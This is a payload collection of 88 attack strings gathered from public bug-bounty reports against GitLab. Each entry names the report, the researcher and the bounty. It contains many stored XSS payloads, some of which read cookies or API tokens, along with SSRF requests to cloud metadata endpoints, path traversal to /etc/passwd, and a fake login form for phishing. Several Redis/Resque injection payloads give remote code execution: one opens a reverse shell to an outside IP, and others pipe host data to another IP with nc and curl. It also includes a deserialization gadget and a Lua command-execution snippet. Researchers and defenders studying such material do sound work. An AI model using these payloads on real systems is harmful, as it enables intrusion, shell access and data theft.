# GitLab

88 payloads.

### `65437ea7`

```
[clickme](vbscript:alert(document.domain))
```

— [Markdown based stored XSS (IE only)](https://hackerone.com/reports/118024) · GitLab · [a0xnirudh](https://hackerone.com/a0xnirudh)

### `c77f3d69`

```
javascript:alert("Current user its API token: " + window.gon.api_token);
```

— [Persistent XSS on public project page](https://hackerone.com/reports/129736) · GitLab · [jobert](https://hackerone.com/jobert)

### `01e4980f`

```
XSS[JaVaScriPt:alert(1)] <-- click to test
```

— [\[RDoc\] XSS in project README files](https://hackerone.com/reports/200693) · GitLab · [ysx](https://hackerone.com/ysx)

### `f74c5336`

```
`Security test link`__.

__ javascript:alert(document.domain)
```

— [\[reStructuredText\] XSS in project README files](https://hackerone.com/reports/205497) · GitLab · [ysx](https://hackerone.com/ysx)

### `f0826111`

```
"Security test link":javascript:alert(document.domain)
```

— [\[Textile\] XSS in project README files](https://hackerone.com/reports/205498) · GitLab · [ysx](https://hackerone.com/ysx)

### `a0782c52`

```
http://localhost/
```

— [SSRF vulnerability in target.com via project import.](https://hackerone.com/reports/215105) · GitLab · [edoverflow](https://hackerone.com/edoverflow)

### `cc7de216`

```
http://<instance>/<user>/<repository>/import?continue[to]=//target.com
```

**Parameter:** `continue[to]`
— [\[Repository Import\] Open Redirect via "continue\[to\]" parameter ](https://hackerone.com/reports/215970) · GitLab · [ysx](https://hackerone.com/ysx)

### `839e0276`

```
<pre class="zen-backdrop fullscreen sherlock-line-samples-table center">
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<img src="https://target.com/images/press/logo/wm_no_bg.svg" width="500">
<h2>Hello there! Something has gone wrong, we are working on it.</h2>
<h3>In the meantime, play a game with us at <a href="http://example.com/">example.com</a>.</h3>
</pre>
```

— [Unfiltered `class` attribute in markdown code](https://hackerone.com/reports/216453) · GitLab · [chalker](https://hackerone.com/chalker)

### `8b9ec9bf`

```
url = javascript:alert('XSS');
```

**Parameter:** `url`
— [Stored XSS on Files overview by abusing git submodule URL](https://hackerone.com/reports/218872) · GitLab · [jobert](https://hackerone.com/jobert)

### `db68c390`

```
%3Ca+href%3D%22%01java%03script%3Aconfirm%28document.domain%29%22%3EClick+to+execute%3Ca%3E%0D%0A
```

— [\[Markdown\] Stored XSS via character encoding parser bypass](https://hackerone.com/reports/270999) · GitLab · [ysx](https://hackerone.com/ysx)

### `d26fb92d`

```
POST /root/test/hooks HTTP/1.1
Host: gitlab-instance
...
----------1282688597
Content-Disposition: form-data; name="hook[url]"

http://127.0.0.1:6379/
----------1282688597
Content-Disposition: form-data; name="hook[token]"

A
...
```

**Parameter:** `hook[token]`
— [Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook](https://hackerone.com/reports/299473) · GitLab · [jobert](https://hackerone.com/jobert) · $750.0

### `91fb5e8c`

```
127.0.0.1:6379
```

— [Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook](https://hackerone.com/reports/299473) · GitLab · [jobert](https://hackerone.com/jobert) · $750.0

### `216b4f38`

```
http://127.0.0.1:6379/
```

— [Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook](https://hackerone.com/reports/299473) · GitLab · [jobert](https://hackerone.com/jobert) · $750.0

### `eeabc759`

```
127.0.0.1
```

— [Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook](https://hackerone.com/reports/299473) · GitLab · [jobert](https://hackerone.com/jobert) · $750.0

### `0c236890`

```
a:
  script:
  - ls -lashR
  cache:
    key: ../1/cache
    policy: pull
    paths:
      - .
```

**Parameter:** `key`
— [GitLab CI runner can read and poison cache of all other projects](https://hackerone.com/reports/301432) · GitLab · [jobert](https://hackerone.com/jobert) · $2,000.0

### `0f41a4a5`

```
a:
  script:
  - echo 1 > file-to-poison
  cache:
    key: ../1/cache
    policy: push
    paths:
      - file-to-poison
```

**Parameter:** `key`
— [GitLab CI runner can read and poison cache of all other projects](https://hackerone.com/reports/301432) · GitLab · [jobert](https://hackerone.com/jobert) · $2,000.0

### `d040fb06`

```
http://127.0.0.1:80/haha.txt
```

**Parameter:** `url`
— [SSRF vulnerability in target.com webhook](https://hackerone.com/reports/301924) · GitLab · [wuqidashi](https://hackerone.com/wuqidashi)

### `aaa9f888`

```
http://127.0.0.1:9200/haha.txt
```

— [SSRF vulnerability in target.com webhook](https://hackerone.com/reports/301924) · GitLab · [wuqidashi](https://hackerone.com/wuqidashi)

### `7c01cfb9`

```
1. Set your own username as "<img src=x onerror=alert(document.domain)> foo / bar"
```

**Parameter:** `username`
— [XSS (Persistent) - Selecting role(s) for protected branches](https://hackerone.com/reports/346111) · GitLab · [phillycheeze](https://hackerone.com/phillycheeze)

### `788ce1ff`

```
curl -L http://169.254.169.254/metadata/v1/
```

— [SSRF in CI after first run](https://hackerone.com/reports/369451) · GitLab · [plazmaz](https://hackerone.com/plazmaz)

### `65d4eaac`

```
http://169.254.169.254/metadata/v1.json
```

— [SSRF in CI after first run](https://hackerone.com/reports/369451) · GitLab · [plazmaz](https://hackerone.com/plazmaz)

### `20c02c86`

```
http://169.254.169.254/metadata/v1/
```

— [SSRF in CI after first run](https://hackerone.com/reports/369451) · GitLab · [plazmaz](https://hackerone.com/plazmaz)

### `4b59f1ff`

```
![xss" onload=alert(1);//](a)
```

**Parameter:** `description`
— [Stored XSS on Issue details page](https://hackerone.com/reports/384255) · GitLab · [8ayac](https://hackerone.com/8ayac)

### `d639f1ab`

```
<img/src=x onerror=alert(1)>
```

**Parameter:** `merge_request[source_branch]`
— [Stored XSS in merge request pages](https://hackerone.com/reports/409380) · GitLab · [8ayac](https://hackerone.com/8ayac)

### `c439b71f`

```
PUT /[username]/[project_name]/boards/[board_id].json HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 178
Connection: close
Cookie: [Cookies]

{"board":{"id":857058,"name":"Development","labels":[{"id":,"title":"","color":"#428BCA"}],"milestone_id":null,"assign
```

**Parameter:** `label_ids`
— [Add and Access to Labels of any Private Projects/Groups of Gitlab(IDOR)](https://hackerone.com/reports/439729) · GitLab · [indoappsec](https://hackerone.com/indoappsec)

### `ceb2710d`

```
git://127.0.0.1:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|/usr/bin/python3 -c \\\\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"118.89.198.146\\\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\\\\\'\').read\"],\"retry\":3,\"queue\":\"system_hoo
```

**Parameter:** `project[remote_mirrors_attributes][0][url]`
— [CRLF injection & SSRF in git:// protocal lead to arbitrary code execution](https://hackerone.com/reports/441090) · GitLab · [chromium1337](https://hackerone.com/chromium1337)

### `678de116`

```
<script>alert(1)</script>
```

— [Persistent XSS via e-mail when creating merge requests](https://hackerone.com/reports/496973) · GitLab · [mario-areias](https://hackerone.com/mario-areias)

### `eec08019`

```
4. Create any file but choose a different target branch (something like <script>alert(1)</script>
```

— [Persistent XSS via e-mail when creating merge requests](https://hackerone.com/reports/496973) · GitLab · [mario-areias](https://hackerone.com/mario-areias)

### `d043126a`

```
"notes": [
        {
          "id": 1,
          "note": "interesting note here",
          "note_html": "<img src=\"test\" onerror=\"alert(document.domain)\"></img>html overwritten",
          "cached_markdown_version": 917504,
```

**Parameter:** `note_html`
— [Persistent XSS in Note objects](https://hackerone.com/reports/508184) · GitLab · [saltyyolk](https://hackerone.com/saltyyolk) · $4,500.0

### `2adae9d4`

```
[XSS](.alert(1);)
```

**Parameter:** `content`
— [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) · GitLab · [ryhmnlfj](https://hackerone.com/ryhmnlfj)

### `4de91efe`

```
.alert(1);
```

**Parameter:** `content`
— [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) · GitLab · [ryhmnlfj](https://hackerone.com/ryhmnlfj)

### `f22e121d`

```
javascript:STRING_EXPECTED_REMOVING
```

**Parameter:** `title`
— [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) · GitLab · [ryhmnlfj](https://hackerone.com/ryhmnlfj)

### `5a56c284`

```
JavaScript::SubClassName.function_name
```

**Parameter:** `title`
— [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) · GitLab · [ryhmnlfj](https://hackerone.com/ryhmnlfj)

### `0fd3bd55`

```
http://169.254.169.254
```

— [Server Side Request Forgery mitigation bypass](https://hackerone.com/reports/632101) · GitLab · [mclaren650sspider](https://hackerone.com/mclaren650sspider)

### `32716436`

```
payload i use = "><img src=x onerror=prompt(123)>
```

— [Stored XSS in "Create Groups"](https://hackerone.com/reports/647130) · GitLab · [rioncool22](https://hackerone.com/rioncool22) · $2,500.0

### `976df397`

```
<div class="md md-file">
  <p>Full Page link</p>
  <p><a href="a" rel="nofollow"></a><a href="https://target.com/users/signin" class="atwho-view select2-drop-mask pika-select" rel="nofollow"><img height="10000" width="10000"></a></p>
</div>
```

— [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,500.0

### `3558f1b5`

```
a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://target.com/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="passwor
```

— [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,500.0

### `34af673c`

```
{<img src>}[link]
```

— [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,500.0

### `17ae2dba`

```
javascript:alert(window.opener.document.location)
```

— [Stored XSS for Grafana dashboard URL](https://hackerone.com/reports/684268) · GitLab · [xanbanx](https://hackerone.com/xanbanx)

### `4c685ade`

```
@startuml
start
    :Do some stuff;
    !include http://169.254.169.254/
stop;
@enduml
```

— [SSRF In plantuml (on target.com)](https://hackerone.com/reports/689245) · GitLab · [plazmaz](https://hackerone.com/plazmaz)

### `0b4586bc`

```
touch 1.txt
    git add 1.txt
    git commit -m "initial commit"
    git push origin master
    
    git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
    touch 2.txt
    git add 2.txt
    git commit -m "add 2.txt"
    git push origin "<img/src='x'/onerror=alert(document.domain)>"
    
    git checkout master
    touch 3.txt
    git add 3.txt
    git commit -m "add 3.txt"
    git push origin master
```

**Parameter:** `branch_name`
— [Stored XSS in merge request pages](https://hackerone.com/reports/723307) · GitLab · [mike12](https://hackerone.com/mike12) · $3,500.0

### `c3bef5a5`

```
<img/src='x'/onerror=alert(document.domain)>
```

**Parameter:** `branch_name`
— [Stored XSS in merge request pages](https://hackerone.com/reports/723307) · GitLab · [mike12](https://hackerone.com/mike12) · $3,500.0

### `38abf45c`

```
gem '<img/src/onerror=alert(location)>', '2'
```

— [Double linking cause XSS (but blokeced by CSP in target.com)](https://hackerone.com/reports/729341) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q)

### `790603d8`

```
<span class="s1">'<a href="<a href=" https:="" target.com="" gems="" "="">https://target.com/gems/</a><img src="" onerror="alert(location)">" rel="nofollow noreferrer noopener" target="_blank"&gt;&lt;img/src/onerror=alert(location)&gt;'</span>
```

— [Double linking cause XSS (but blokeced by CSP in target.com)](https://hackerone.com/reports/729341) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q)

### `c829d276`

```
{
  "swagger" : "2.0",
  "info" : {
    "description" : "<a href=https://target.com/yvvdwf/data/-/wikis/evil.com data-type=script style='cursor:default' data-remote=true class='atwho-view select2-drop-mask pika-select'></a><script>alert(0)</script>"
  }}
```

— [Stored XSS in blob viewer](https://hackerone.com/reports/806571) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `319e5d79`

```
http://metadata.google.internal/
```

— [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361) · GitLab · [vakzz](https://hackerone.com/vakzz) · $10,000.0

### `f958660f`

```
http://localhost:9090/api/v1/targets
```

— [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361) · GitLab · [vakzz](https://hackerone.com/vakzz) · $10,000.0

### `e6246d42`

```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

— [Arbitrary file read via the UploadsRewriter when moving and issue](https://hackerone.com/reports/827052) · GitLab · [vakzz](https://hackerone.com/vakzz) · $20,000.0

### `bf482449`

```
alert('Hello: ' + window.parent.location.href);
```

— [XSS on Issue reference numbers](https://hackerone.com/reports/831962) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `341716f2`

```
<svg>
```

— [XSS on Issue reference numbers](https://hackerone.com/reports/831962) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `4344e3b0`

```
<script src=alert.js></script
```

— [XSS on Issue reference numbers](https://hackerone.com/reports/831962) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `d7019d11`

```
deploy:
      stage: deploy
      script:
        - echo "Example"
      environment:
        name: production
        url: https://target.com
        kubernetes:
          namespace: <img src=x onerror=alert(1)>
      only:
      - master
```

**Parameter:** `namespace`
— [Stored XSS on the job page](https://hackerone.com/reports/856554) · GitLab · [mike12](https://hackerone.com/mike12) · $3,000.0

### `1963b9bf`

```
requires_python='"><script>alert(1)</script>'
```

**Parameter:** `requires_python`
— [Stored XSS on PyPi simple API endpoint](https://hackerone.com/reports/856836) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,000.0

### `6ab023d8`

```
foo style=animation-name:gl-spinner-rotate onanimationend=alert(1)
```

**Parameter:** `full_name`
— [Stored XSS in group issue list](https://hackerone.com/reports/859333) · GitLab · [mike12](https://hackerone.com/mike12) · $2,000.0

### `ac51b4b1`

```
`<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "                                                "><svg onload="alert(1)" xmlns="                          ">
```

— [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/880099) · GitLab · [semsem123](https://hackerone.com/semsem123)

### `a6dce1ba`

```
<form>any <b>html</b> can go <button>here<a data-remote="true" data-method="get" data-type="script" href="https://target.com/-/snippets/1999974/raw" class="atwho-view select2-drop-mask pika-select">
  <img width="10000" height="10000">
</a></button></form>
```

— [SafeParamsHelper::safe_params is not so safe](https://hackerone.com/reports/946728) · GitLab · [vakzz](https://hackerone.com/vakzz) · $4,000.0

### `49f013a0`

```
https://target.com/vakzz-h1/redirect1/-/issues?script_name=javascript:alert(1
```

**Parameter:** `script_name`
— [SafeParamsHelper::safe_params is not so safe](https://hackerone.com/reports/946728) · GitLab · [vakzz](https://hackerone.com/vakzz) · $4,000.0

### `2df0ff5c`

```
[user]
	name = anyname
	email = "#' style=animation-name:blinking-dot onanimationstart=alert(document.domain) other"
```

**Parameter:** `email`
— [Stored-XSS on wiki pages](https://hackerone.com/reports/1087061) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `9fb6d2d7`

```
http://127.0.0.1:9090/api/v1/targets.
```

— [FogBugz import attachment full SSRF requiring vulnerability in *.target.com](https://hackerone.com/reports/1092230) · GitLab · [ajxchapman](https://hackerone.com/ajxchapman)

### `b3cf7708`

```
[#goals]

[plantuml, test="{counter:kroki-plantuml-include:/etc/passwd}", format="png"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- {counter:kroki-plantuml-include}
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

— [Kroki Arbitrary File Read/Write ](https://hackerone.com/reports/1098793) · GitLab · [ledz1996](https://hackerone.com/ledz1996)

### `d879f4ee`

```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
```

— [Stored DOM XSS via Mermaid chart](https://hackerone.com/reports/1103258) · GitLab · [taraszelyk](https://hackerone.com/taraszelyk) · $3,000.0

### `1ec47fbf`

```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

— [Stored DOM XSS via Mermaid chart](https://hackerone.com/reports/1103258) · GitLab · [taraszelyk](https://hackerone.com/taraszelyk) · $3,000.0

### `119ac9d7`

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="none">
    <meta name="referrer" content="no-referrer">
</head>
<body>
      <form action="https://target.com/api/graphql/" id="csrf-form" method="GET">
        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $
```

— [CSRF on /api/graphql allows executing mutations through GET requests](https://hackerone.com/reports/1122408) · GitLab · [az3z3l](https://hackerone.com/az3z3l) · $3,370.0

### `561ce09c`

```
puts "hello from ruby"
`echo vakzz was here > /tmp/vakzz`
```

— [RCE via unsafe inline Kramdown options when rendering certain Wiki pages](https://hackerone.com/reports/1125425) · GitLab · [vakzz](https://hackerone.com/vakzz) · $20,000.0

### `61f62d7a`

```
https://localhost/-/jira_connect/users?return_to=javascript:alert(location)
```

**Parameter:** `return_to`
— [XSS by clicking Jira's link](https://hackerone.com/reports/1194254) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q) · $1,130.0

### `8db799b3`

```
mutation {
  createCustomEmoji(input: 
    {
      groupPath: "xss_target", 
      name:"xssreplace",
      url:"http://aaa#'><img onerror=alert(location) src=.>"
    }) {
    customEmoji {
      id
      name
      url
    }
  }
}
```

**Parameter:** `url`
— [Stored XSS in custom emoji](https://hackerone.com/reports/1198517) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q) · $3,000.0

### `0c9c6193`

```
<iframe srcdoc>
```

— [Stored XSS in Mermaid when viewing Markdown files](https://hackerone.com/reports/1212822) · GitLab · [saleemrashid](https://hackerone.com/saleemrashid)

### `9b2ce555`

```
<pre data-sourcepos="&#34; href=&#34;x&#34;></pre>
<gl-emoji data-name='&#34;x=&#34y&#34 onload=&#34;alert(document.location.href)&#34;' data-unicode-version='x'>
abc
</gl-emoji>
<pre x=&#34;">
<code></code></pre>
```

— [Stored XSS on issue comments and other pages which contain notes](https://hackerone.com/reports/1398305) · GitLab · [jarij](https://hackerone.com/jarij) · $3,000.0

### `e327613f`

```
<lua>
_,execute = pcall(loadstring,
    [[
        local command = ...;
        local handle = io.popen(command)
        local result = handle:read("*a")
        handle:close()
        return result;
    ]]
);

print(execute('id'));
execute('echo vakzz > /tmp/ggg');
</lua>
```

— [RCE via WikiCloth markdown rendering if the `rubyluabridge` gem is installed](https://hackerone.com/reports/1401444) · GitLab · [vakzz](https://hackerone.com/vakzz) · $3,000.0

### `3b5be6ed`

```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://target.com>
<pre x=&#34;">
<code></code></pre>
```

— [Stored XSS in Notes (with CSP bypass for target.com)](https://hackerone.com/reports/1481207) · GitLab · [joaxcar](https://hackerone.com/joaxcar) · $13,950.0

### `bda19453`

```
{
   "id": "<img src=# height=10000 width=10000>",
   "url": "javascript:alert(document.domain)"
}
```

— [XSS in ZenTao integration affecting self hosted instances without strict CSP](https://hackerone.com/reports/1542510) · GitLab · [joaxcar](https://hackerone.com/joaxcar) · $13,950.0

### `c07f2962`

```
<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
```

— [XSS: `v-safe-html` is not safe enough](https://hackerone.com/reports/1579645) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `242e60f0`

```
'1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">':
  stage: build
  script: echo "hi"

'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>':
  stage: build
  script: echo "hi"

trigger-xss:
  stage: test
  script: e
```

— [XSS: `v-safe-html` is not safe enough](https://hackerone.com/reports/1579645) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `4f678da6`

```
test <script>alert(document.domain)</script>
```

**Parameter:** `title`
— [CSP-bypass XSS in project settings page](https://hackerone.com/reports/1588732) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `79f0d373`

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \').read\"],"queue\":\"system_hook_push\"}"
```

— [RCE via github import](https://hackerone.com/reports/1672388) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `7fb9bced`

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\"], \"queue\":\"system_hook_push\"}"
```

— [RCE via github import](https://hackerone.com/reports/1672388) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `33c23636`

```
\r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r
```

— [RCE via github import](https://hackerone.com/reports/1672388) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `8d1182b2`

```
curl "http://target.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" \
  --data '{
    "personal_access_token": "xxxxx",
    "repo_id": "356289002",
    "target_namespace": "root",
    "new_name": "NEW-NAME-'$(date +%s)'",
    "github_hostname": "http://evil.com:80"
}'
```

**Parameter:** `github_hostname`
— [RCE via github import](https://hackerone.com/reports/1672388) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `fe5c3fbc`

```
">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>
```

— [Bypass: Stored-XSS with CSP-bypass via scoped labels' color](https://hackerone.com/reports/1693150) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `d18883ea`

```
<a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
```

— [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) · GitLab · [vakzz](https://hackerone.com/vakzz) · $13,950.0

### `103da412`

```
{"html":"<script>alert(document.domain)</script>"}
```

— [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) · GitLab · [vakzz](https://hackerone.com/vakzz) · $13,950.0

### `eebd4131`

```
<style><img/src="0"onerror="alert(0)"></style>
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `708c800d`

```
<svg><style><img/src="0"onerror="alert(0)"></style></svg>
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `89bd5051`

```
<svg><style></style></svg>
<img src="0" onerror="alert(0)">
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `8ebb91af`

```
<img/src="0"onerror="alert(0)">
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `c0aee335`

```
<img src="0" onerror="alert(0)">
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `d0af4a34`

```
<i class=gl-show-field-errors><input title="<script>alert(document.domain)</script>"/></i>
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)

### `1cf452c2`

```
POST /api/graphql HTTP/2
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1620
Origin: https://target.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) {\n  mlModel(id: $id) {\n    
```

**Parameter:** `variables.id`
— [IDOR Exposes All Machine Learning Models](https://hackerone.com/reports/2528293) · GitLab · [moblig](https://hackerone.com/moblig) · $1,160.0
